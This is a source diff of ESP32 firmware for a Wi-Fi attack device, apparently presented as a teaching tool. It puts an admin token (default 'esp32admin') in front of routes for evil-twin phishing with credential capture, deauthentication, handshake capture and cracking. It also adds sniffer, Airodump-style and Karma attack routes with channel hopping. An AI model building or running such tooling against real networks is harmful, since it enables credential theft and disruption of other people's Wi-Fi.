+static void onAdmin(const char *uri, HTTPMethod method, void (*fn)()) {
+  server.on(uri, method, [fn]() {
+    if (requireAdmin()) fn();
+  });
+}
+
 static void captiveRedirect(const char *type = "text/plain") {
   // 当开启邪恶双子实验时，优先弹出钓鱼验证门户；否则弹出后台管理 (CNA 要求绝对 URI)
   const char *loc = sEvilTwin.active ? "http://192.168.4.1/portal.html" : ADMIN_HTML_C;
@@ -1463,7 +1993,7 @@ static void notFound() {
   if (server.method() == HTTP_OPTIONS) {
     server.sendHeader("Access-Control-Allow-Origin", "*");
     server.sendHeader("Access-Control-Allow-Methods", "GET,POST,DELETE,OPTIONS");
-    server.sendHeader("Access-Control-Allow-Headers", "Content-Type");
+    server.sendHeader("Access-Control-Allow-Headers", "Content-Type, X-Admin-Token");
     server.send(204);
     return;
   }
@@ -1497,6 +2027,8 @@ void setup() {
   sPrefs.begin("esp32-cfg", false);
   apChannel = sPrefs.getUChar("channel", AP_CHANNEL_DEFAULT);
   if (apChannel < 1 || apChannel > 13) apChannel = AP_CHANNEL_DEFAULT;
+  sAdminToken = sPrefs.getString("adminToken", ADMIN_TOKEN_DEFAULT);
+  if (sAdminToken.length() == 0) sAdminToken = ADMIN_TOKEN_DEFAULT;
 
   uint8_t apMac[6];
   WiFi.softAPmacAddress(apMac);
@@ -1515,6 +2047,11 @@ void setup() {
   log("[wifi] AP 已启动: SSID=" + apSsid + "  密码=" + AP_PASSWORD + "  信道=" + String(apChannel));
   log("[wifi] 后台: " + String(ADMIN_HTML_C));
   log("[system] 芯片: " + detectChipKey() + "  FreeHeap: " + String(ESP.getFreeHeap()) + " bytes");
+  if (sAdminToken == ADMIN_TOKEN_DEFAULT) {
+    log("[admin] 后台口令保护已启用, 出厂默认口令: " + String(ADMIN_TOKEN_DEFAULT) + " (请登录后在「配置」页修改)");
+  } else {
+    log("[admin] 后台口令保护已启用 (自定义口令)");
+  }
 
   // 上电遥测: 设备身份 (只读)
   emitJson("boot",
@@ -1524,37 +2061,55 @@ void setup() {
            "\",\"mac\":\"" + formatMac(apMac) +
            "\",\"channel\":" + String(apChannel));
 
+  // 后台口令保护: 默认口令 esp32admin, 首次登录后请在「配置」页修改
+  static const char *adminHeaders[] = {"X-Admin-Token", "Content-Type"};
+  server.collectHeaders(adminHeaders, 2);
+
   server.on("/", HTTP_GET, redirectToAdmin);
   server.on("/admin.html", HTTP_GET, sendAdminPage);
   server.on("/portal.html", HTTP_GET, sendPortalPage);
   server.on("/api/portal/submit", HTTP_POST, handlePortalSubmit);
-  server.on("/api/info", HTTP_GET, sendInfo);
-  server.on("/api/scan", HTTP_GET, handleScan);
-  server.on("/api/target", HTTP_POST, handleTarget);
-  server.on("/api/twin", HTTP_POST, handleTwinAdd);
-  server.on("/api/twin", HTTP_DELETE, handleTwinRemove);
-  server.on("/api/config", HTTP_GET, handleGetConfig);
-  server.on("/api/config", HTTP_POST, handleConfig);
+  onAdmin("/api/info", HTTP_GET, sendInfo);
+  onAdmin("/api/scan", HTTP_GET, handleScan);
+  onAdmin("/api/target", HTTP_POST, handleTarget);
+  onAdmin("/api/twin", HTTP_POST, handleTwinAdd);
+  onAdmin("/api/twin", HTTP_DELETE, handleTwinRemove);
+  onAdmin("/api/config", HTTP_GET, handleGetConfig);
+  onAdmin("/api/config", HTTP_POST, handleConfig);
   
   // 3 大教学验证板块路由
-  server.on("/api/eviltwin/start", HTTP_POST, handleEvilTwinStart);
-  server.on("/api/eviltwin/stop", HTTP_POST, handleEvilTwinStop);
-  server.on("/api/eviltwin/creds", HTTP_GET, handleEvilTwinCreds);
-  server.on("/api/eviltwin/creds", HTTP_DELETE, handleEvilTwinClearCreds);
+  onAdmin("/api/eviltwin/start", HTTP_POST, handleEvilTwinStart);
+  onAdmin("/api/eviltwin/stop", HTTP_POST, handleEvilTwinStop);
+  onAdmin("/api/eviltwin/creds", HTTP_GET, handleEvilTwinCreds);
+  onAdmin("/api/eviltwin/creds", HTTP_DELETE, handleEvilTwinClearCreds);
   
-  server.on("/api/deauth/start", HTTP_POST, handleDeauthStart);
-  server.on("/api/deauth/stop", HTTP_POST, handleDeauthStop);
-  server.on("/api/deauth/status", HTTP_GET, handleDeauthStatus);
+  onAdmin("/api/deauth/start", HTTP_POST, handleDeauthStart);
+  onAdmin("/api/deauth/stop", HTTP_POST, handleDeauthStop);
+  onAdmin("/api/deauth/status", HTTP_GET, handleDeauthStatus);
 
-  server.on("/api/handshake/start", HTTP_POST, handleHandshakeStart);
-  server.on("/api/handshake/stop", HTTP_POST, handleHandshakeStop);
-  server.on("/api/handshake/crack", HTTP_POST, handleHandshakeCrack);
-  server.on("/api/handshake/status", HTTP_GET, handleHandshakeStatus);
-  server.on("/api/handshake/dump", HTTP_GET, handleHandshakeDump);
+  onAdmin("/api/handshake/start", HTTP_POST, handleHandshakeStart);
+  onAdmin("/api/handshake/stop", HTTP_POST, handleHandshakeStop);
+  onAdmin("/api/handshake/crack", HTTP_POST, handleHandshakeCrack);
+  onAdmin("/api/handshake/status", HTTP_GET, handleHandshakeStatus);
+  onAdmin("/api/handshake/dump", HTTP_GET, handleHandshakeDump);
 
-  server.on("/api/log", HTTP_GET, handleLog);
-  server.on("/api/reset", HTTP_POST, doReset);
-  server.on("/api/factory-reset", HTTP_POST, doFactoryReset);
+  // 数据包分析器、Airodump侦察与 Karma 攻击路由
+  onAdmin("/api/sniffer/start", HTTP_POST, handleSnifferStart);
+  onAdmin("/api/sniffer/stop", HTTP_POST, handleSnifferStop);
+  onAdmin("/api/sniffer/status", HTTP_GET, handleSnifferStatus);
+
+  onAdmin("/api/airodump/start", HTTP_POST, handleAirodumpStart);
+  onAdmin("/api/airodump/stop", HTTP_POST, handleAirodumpStop);
+  onAdmin("/api/airodump/status", HTTP_GET, handleAirodumpStatus);
+
+  onAdmin("/api/karma/start", HTTP_POST, handleKarmaStart);
+  onAdmin("/api/karma/stop", HTTP_POST, handleKarmaStop);
+  onAdmin("/api/karma/status", HTTP_GET, handleKarmaStatus);
+  onAdmin("/api/karma/crack", HTTP_POST, handleHandshakeCrack);
+
+  onAdmin("/api/log", HTTP_GET, handleLog);
+  onAdmin("/api/reset", HTTP_POST, doReset);
+  onAdmin("/api/factory-reset", HTTP_POST, doFactoryReset);
   server.onNotFound(notFound);
   server.begin();
   log("[http] 管理后台 HTTP 服务已启动 (80)");
@@ -1672,6 +2227,34 @@ void loop() {
       sHandshake.cracking = false;
     }
   }
+
+  // 4. 数据包分析器: 真实帧由 promiscuous 回调写入, 这里只做信道跳频与 fps 统计
+  if (sSniffer.running) {
+    // 单射频: 与握手/Deauth/邪恶双子冲突时停驻当前信道, 避免破坏正在进行的捕获或注入
+    if (sSniffer.hopping && !sHandshake.capturing && !sDeauth.running && !sEvilTwin.active &&
+        now - sSniffer.lastHopTime >= 400) {
+      sSniffer.lastHopTime = now;
+      uint8_t next = (sSniffer.channel >= 13) ? 1 : (uint8_t)(sSniffer.channel + 1);
+      if (applyApChannel(next)) sSniffer.channel = next;
+    }
+    if (now - sSniffer.lastFpsCalc >= 1000) {
+      sSniffer.fps = sSniffer.fpsAccum;
+      sSniffer.fpsAccum = 0;
+      sSniffer.lastFpsCalc = now;
+    }
+  }
+
+  // 5. Airodump: 对端聚合由 promiscuous 回调写入, 这里只做信道跳频
+  if (sAirodump.running) {
+    if (sAirodump.hopping && !sHandshake.capturing && !sDeauth.running && !sEvilTwin.active &&
+        now - sAirodump.lastHopTime >= 700) {
+      sAirodump.lastHopTime = now;
+      uint8_t next = (sAirodump.currentChannel >= 13) ? 1 : (uint8_t)(sAirodump.currentChannel + 1);
+      if (applyApChannel(next)) sAirodump.currentChannel = next;
+    }
+  }
+
+  // 6. Karma: Probe Request 由 promiscuous 回调实时记录, 无需定时器
 
   // 客户端上下线遥测: 由 softAP 客户端数变化推导 (只读计数)
   static uint8_t lastClients = 0;
